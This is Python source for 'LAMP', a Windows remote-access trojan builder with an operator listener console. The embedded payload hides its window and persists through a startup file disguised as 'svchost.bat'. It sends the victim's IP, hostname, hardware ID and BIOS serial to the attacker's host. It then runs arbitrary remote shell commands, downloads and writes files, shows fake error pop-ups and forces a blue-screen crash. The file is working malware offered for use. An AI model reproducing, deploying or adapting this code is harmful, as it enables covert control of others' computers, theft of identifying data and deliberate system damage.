import os
import sys
import subprocess
import time
import random
from importlib_metadata import version
import requests
import socket
from colorama import Fore, Back, Style

os.system("cls")

def checkinternet():
    try:
        requests.get('https://www.google.com')
        return True
    except requests.ConnectionError:
        return False
    
#Prefix
waiting = Fore.CYAN+"["+Fore.LIGHTMAGENTA_EX+"#"+Fore.CYAN+"]"+Fore.RESET
succes = Fore.CYAN+"["+Fore.LIGHTGREEN_EX+"+"+Fore.CYAN+"]"+Fore.RESET
error = Fore.CYAN+"["+Fore.LIGHTRED_EX+"-"+Fore.CYAN+"]"+Fore.RESET
warning = Fore.CYAN+"["+Fore.LIGHTYELLOW_EX+"!"+Fore.CYAN+"]"+Fore.RESET
inputpre = Fore.CYAN+"["+Fore.GREEN+"$"+Fore.CYAN+"]"+Fore.RESET+"|>>>"
found_pre = Fore.LIGHTCYAN_EX+"["+Fore.LIGHTWHITE_EX+"."+Fore.LIGHTCYAN_EX+"]"+Fore.RESET+" "
#VARS
path = "C:\STK\\bin\STK"
version = open(path+"\\asset\\version.stk", "r").read().split("\n")[0]
ip = requests.get('https://api.ipify.org').text
ipv4 = socket.gethostbyname(socket.gethostname())
hostname = socket.gethostname()
hwid = subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split('\n')[1].strip()
serial_nr = subprocess.check_output("wmic bios get serialnumber", shell=True).decode().split('\n')[1].strip()

def logtime():
    day = time.strftime("%d")
    month = time.strftime("%m")
    year = time.strftime("%Y")
    timec = time.strftime("%H:%M:%S")
    string = f"[{day}/{month}/{year} {timec}] "
    return string



def build(h, p, f, r, t):
    host = h
    port = p
    backdoor = f
    reconnect = r
    timeout = t
    name = input(inputpre+" Name of the trojan: ")
    if not os.path.exists(path+"\\Tools\\LAMP"):
        os.makedirs(path+"\\Tools\\LAMP")
    with open(path+"\\Tools\\LAMP\\log.txt", "w") as f:
        day = time.strftime("%d")
        month = time.strftime("%m")
        year = time.strftime("%Y")
        timec = time.strftime("%H:%M:%S")
        string = f"{day}/{month}/{year} {timec}"
        f.write(f"Name: {name}\nHost: {host}\nPort: {port}\nBackdoor: {backdoor}\nReconnect: {reconnect}\nTimeout: {timeout}\nTIME: {string}")
    print(logtime()+succes+" Log file created!")
    print(logtime()+waiting+" Generating the trojan...")
    print(logtime()+waiting+" Getting source code...")
    trojan_code = f'''HOST="{host}"
PORT={port}
BACKDOOR="{backdoor}"
RECONNECT="{reconnect}"
TIMEOUT={timeout}
NAME="{name}"\n'''+ r'''from win32api import *
import getpass
USER_NAME = getpass.getuser()
from win32con import *
def message_box(title, text, style):
    MessageBox(0, text, title, style)
import socket
import os
import sys
import subprocess
import time
import requests
import ctypes
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "svchost.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path+f"\\{NAME}.py")
if BACKDOOR == "true":
    add_to_startup()
kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')
SW_HIDE = 0
hWnd = kernel32.GetConsoleWindow()
user32.ShowWindow(hWnd, SW_HIDE)
ip = requests.get('https://api.ipify.org').text
ipv4 = socket.gethostbyname(socket.gethostname())
hostname = socket.gethostname()
hwid = subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split("\n")[1].strip()
serial_nr = subprocess.check_output("wmic bios get serialnumber", shell=True).decode().split("\n")[1].strip()
from ctypes.wintypes import BOOL, ULONG
import ctypes
ENABLED = BOOL()
RESPONSE = ULONG()
OPTION_SHUTDOWN = 6
SHUTDOWN_PRIVILEGE = 19
STATUS_NOT_IMPLEMENTED = 0xC0000002
class Bluescreen:
    def __init__(self):
        self.ntdll = ctypes.WinDLL('ntdll.dll')

        self._NtRaiseHardError = self.ntdll.NtRaiseHardError
        self._RtlAdjustPrivilege = self.ntdll.RtlAdjustPrivilege
    def bsod(self):
        if not self._RtlAdjustPrivilege(
            SHUTDOWN_PRIVILEGE,
            True,
            False,
            ctypes.byref(
                ENABLED
            )
        ):
            self._NtRaiseHardError(
                STATUS_NOT_IMPLEMENTED,
                0,
                0,
                0,
                OPTION_SHUTDOWN,
                ctypes.byref(
                    RESPONSE
                )
            )
def connect():
    try:
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(100)
        s.connect((HOST, int(PORT)))
        print("[+] Connected to master.")
        s.send(f"PORT: {PORT} HOST: {HOST} IPV4:{ipv4} IP: {ip} hostname: {hostname} hwid: {hwid} mainboardnr: {serial_nr}".encode())
        while True:
            try:
                data = s.recv(1024).decode()
                print(data)
                if data == "$exit":
                    s.close()
                    exit( 0 )
                    sys.exit()
                elif data == "":
                    s.send(b"")
                elif data.startswith("$open"):
                    link = data.split("$open")[1]
                    os.system(f"start {link}")
                elif data.lower() == "$reconnect":
                    if RECONNECT == "true":
                        s.close()
                        time.sleep(10)
                        python = sys.executable
                        os.execl(python, python, * sys.argv)
                elif data.startswith("$exec"):
                    command = data.split("$exec")[1]
                    os.system(command)
                elif data.startswith("$create"):
                    type = data.split(" ")[1]
                    name = data.split(" ")[2]
                    dir = data.split(" ")[3]
                    content = data.split(" ")[4:]
                    if type == "file":
                        with open(dir+"\\"+name, "w+") as file:
                            file.write(" ".join(content).replace("'", "").replace(",", " ").replace("]", "").replace("[", ""))
                    elif type.lower() == "dir":
                        os.mkdir(name)
                elif data.lower() == "$bsod":
                    if BACKDOOR == "true":
                        add_to_startup()
                    message_box("ERROR", "Something went wrong on your pc :(", MB_OK | MB_ICONERROR)
                    bluescreen = Bluescreen()
                    bluescreen.bsod()
                elif data.startswith("$download"):
                    link = data.split(" ")[1]
                    dir = data.split(" ")[2]
                    if not os.path.exists(dir):
                        os.makedirs(dir)
                    r = requests.get(link)
                    print(link.split("/")[-1].split("?")[0])
                    with open(dir + "\\" + link.split("/")[-1].split("?")[0], "wb") as f:
                        f.write(r.content)
                elif data.startswith("$ls"):
                    dir = data.split(" ")[1]
                    files = os.listdir(dir)
                    s.send(f"{' '.join(files)}".encode())
                elif data.startswith("$msg"):
                    title = data.split(" ")[1]
                    text = data.split(" ")[2:]
                    text = " ".join(text).replace("'", "").replace(",", " ").replace("]", "").replace("[", "")
                    message_box(title, text, MB_ICONINFORMATION)
                else:
                    try:
                        end = subprocess.check_output(data, shell=True).decode()
                        s.send(end.encode())
                    except Exception as e:
                        s.send(b"Error: " + str(e).encode())
            except socket.timeout:
                pass
    except:
        print("[!] Error: Could not connect to server.Retrying in 3 seconds...")
        time.sleep(3)
        connect()
connect()'''
    
    print(logtime()+waiting+" Check backdoor...")
    print(logtime()+waiting+" Apply settings...")
    print(logtime()+waiting+" Writing...")
    with open(path+f"\\Tools\\LAMP\\{name}.py", "w") as f:
            f.write(trojan_code)
    print(logtime()+succes+" Trojan generated!")

        
    

    

help_connected = Fore.LIGHTGREEN_EX+'''$exit - Exit the trojan
$help - Show this help
$clear - Clear the screen
$msg <title> <message> - Send a message to the pc
$open <link> - Open a link
$download <link> <dir> <name> - Download a file
$reconnect - Reconnect to the trojan
$exec <command> - Execute a command or without it
$ls <dir> - List files in a directory
$create <type: dir/file> <name> <dir> <content> - Create a file or directory
$bsod - trigger bsod
'''+Fore.RESET


def main():
    print(waiting+" MADE BY: STEIN#7722")
    print(waiting+f" VERSION: {version} \n")
    while True:
        cmd = input(inputpre)
        if cmd == "exit":
            exit()
        elif cmd == "clear":
            os.system("cls")
            display_logo()
            print(Fore.RESET+waiting+" The Tool with Intelligence 💡 \n")
        elif cmd == "help":
            print(succes+" Commands: \n")
            print(waiting+" exit - Exit the program")
            print(waiting+" clear - Clear the screen")
            print(waiting+" help - Show this help")
            print(waiting+" build - build an lamp trojan")
            print(waiting+" listen - start a listener")

        elif cmd == "listen":
            print(waiting+" Arguments: \n")
            print(waiting+" -p <port> - Set the port to connect to")
            print(waiting+" -h <host> - Set the timeout")

        elif cmd.startswith("listen"):
            args = cmd.split(" ")
            try:
                port = args[2]
                host = args[4]
            except:
                print(error+" Missing arguments!")
                continue
            if not port.isdigit():
                print(error+" Invalid port!")
                continue
            print(logtime()+waiting+" Starting listener...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.bind((host, int(port)))
                s.listen(1)
            except KeyboardInterrupt:
                print(error+" Keyboard interrupt!")
                continue
            print(logtime()+succes+" Listener started!")
            while True: 
                s.settimeout(10)
                c, addr = s.accept()
                print(logtime()+succes+" Connection from: "+addr[0])
                data = c.recv(1024)
                print(logtime()+succes+" CLIENT INFOS: \n"+data.decode())
                print(waiting+" Press enter to continue...")
                input()
                while True:
                    try:
                        cmd = input("Listener|"+inputpre)
                        if cmd == " " or cmd == "" or cmd == "\n":
                            print("illegal command")
                        if cmd.lower() == "$exit":
                            c.send(b"$exit")
                            c.close()
                            s.close()
                            print(logtime()+succes+" Connection closed!")
                            time.sleep(1)
                            os.system("cls")
                            main()
                        elif cmd.startswith("$create"):
                            args = cmd.split(" ")
                            try:
                                type = args[1]
                                name = args[2]
                                dir = args[3]
                                content = args[4:]
                                c.send(f"$create {type} {name} {dir} {content}".encode())
                                
                            except:
                                print(error+" Missing arguments!")
                                continue
                                
                        elif cmd.lower() == "$clear":
                            os.system("cls")
                        elif cmd.lower() == "$reconnect":
                            c.send(b"$reconnect")
                            c.close()
                            s.close()
                            print(logtime()+succes+" Connection closed! Please listen again in the next 10 seconds...")
                            main()
                        elif cmd.startswith("$exec"):
                            command = cmd.split(" ")[1]
                            c.send(b"$exec "+command.encode())
                        
                        elif cmd.startswith("$download"):
                            link = cmd.split(" ")[1]
                            dir = cmd.split(" ")[2]
                            c.send(b"$download "+link.encode()+b" "+dir.encode())

                            
                        elif cmd.lower() == "$help":
                            print(help_connected)
                        elif cmd.startswith("$open"):
                            link = cmd.split(" ")[1]
                            c.send(b"$open "+link.encode())
                        elif cmd.startswith("$msg"):
                            args = cmd.split(" ")
                            try:
                                title = args[1]
                                message = args[2:]
                            except:
                                print(error+" Missing arguments!")
                                continue
                            c.send(f"$msg {title} {message}".encode())
                            print(">>> "+title+": "+" ".join(message))
                        else:
                            if cmd != "" or cmd != " " or cmd != "\n":
                                c.send(cmd.encode())
                                try:
                                    data = c.recv(1024)
                                    print(data.decode())
                                except KeyboardInterrupt:
                                    pass
                                except:
                                    pass
                    except KeyboardInterrupt:
                        print(error+" Keyboard interrupt!")
                        break
                    except:
                        s.close()
                        c.close()
                        print(error+" Connection closed!")
                        time.sleep(1)
                        os.system("cls")
                        main()

                c.close()






        elif cmd == "build":
            print(waiting+" Arguments: \n")
            print(waiting+" -h <host> - Set the host to connect to")
            print(waiting+" -p <port> - Set the port to connect to")
            print(waiting+" -f <backdoor> - Set true to use a startup file")
            print(waiting+" -r <reconnect> - Set true to reconnect")
            print(waiting+" -t <timeout> - Set the timeout")
        elif cmd.startswith("build"):
            args = cmd.split(" ")
            try:
                host = args[2]
                port = args[4]
                backdoor = args[6]
                reconnect = args[8]
                timeout = args[10]
            except:
                print(error+" Missing arguments!")
                continue
            print(found_pre+" You set the following options:")
            print(found_pre+" Host: "+host)
            print(found_pre+" Port: "+port)
            print(found_pre+" Backdoor: "+backdoor)
            print(found_pre+" Reconnect: "+reconnect)
            print(found_pre+" Timeout: "+timeout)
            print(waiting+" Are you sure you want to build the trojan? (y/n)")
            answer = input(inputpre)
            if answer == "y":
                os.system("cls")
                print(waiting+" Building the trojan...")
                build(host, port, backdoor, reconnect, timeout)
                print(succes+" Trojan built!")
            else:
                print(error+" Canceled")
                continue
        else:
            print(error+" Unknown command")

















class Logos:
    nr1 = ''' ▄▄▄     ▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄▄ 
█   █   █      █  █▄█  █       █
█   █   █  ▄   █       █    ▄  █
█   █   █ █▄█  █       █   █▄█ █
█   █▄▄▄█      █       █    ▄▄▄█
█       █  ▄   █ ██▄██ █   █    
█▄▄▄▄▄▄▄█▄█ █▄▄█▄█   █▄█▄▄▄█    
    '''
    nr2 = '''▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
██░████░▄▄▀█░▄▀▄░█▀▄▄▀
██░████░▀▀░█░█▄█░█░▀▀░
██░▀▀░█▄██▄█▄███▄█░███
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
    '''
    nr3 = '''╔╗                
║║                
║║   ╔══╗ ╔╗╔╗╔══╗
║║ ╔╗╚ ╗║ ║╚╝║║╔╗║
║╚═╝║║╚╝╚╗║║║║║╚╝║
╚═══╝╚═══╝╚╩╩╝║╔═╝
              ║║  
              ╚╝  '''
    nr4 = '''▄▄▌   ▄▄▄· • ▌ ▄ ·.  ▄▄▄·
██•  ▐█ ▀█ ·██ ▐███▪▐█ ▄█
██ ▪ ▄█▀▀█ ▐█ ▌▐▌▐█· ██▀·
▐█▌ ▄▐█▪ ▐▌██ ██▌▐█▌▐█▪·•
.▀▀▀  ▀  ▀ ▀▀  █▪▀▀▀.▀   '''
    nr5 = '''░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒   ▒▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒    ▒   ▒   ▒▒  ▒   ▒▒
▓   ▓▓▓▓▓▓▓▓▓   ▓▓   ▓▓▓   ▓▓  ▓▓   ▓  ▓▓   ▓
▓   ▓▓▓▓▓▓▓▓   ▓▓▓   ▓▓▓   ▓▓  ▓▓   ▓  ▓▓▓   
▓   ▓▓▓▓▓▓▓▓   ▓▓▓   ▓▓▓   ▓▓  ▓▓   ▓   ▓   ▓
█          ███   █    █    ██  ██   █   █████
█████████████████████████████████████   █████'''

def display_logo():
    #choose a random logo
    logo = random.randint(1,5)
    nr1 = Logos.nr1
    nr2 = Logos.nr2
    nr3 = Logos.nr3
    nr4 = Logos.nr4
    nr5 = Logos.nr5

    if logo == 1:
        print(nr1)
    elif logo == 2:
        print(nr2)
    elif logo == 3:
        print(nr3)
    elif logo == 4:
        print(nr4)
    elif logo == 5:
        print(nr5)

def start_up():
    if checkinternet():
        print(succes + ' Internet is connected')
        os.system("cls")
        print(Fore.LIGHTCYAN_EX)
        display_logo()
        print(Fore.RESET+waiting+" The Tool with Intelligence 💡 \n")
        try:
            main()
        except KeyboardInterrupt:
            print(error+" Keyboard Interrupt")
            exit()
    else:
        print(error + ' Internet is not connected')
        exit()

start_up()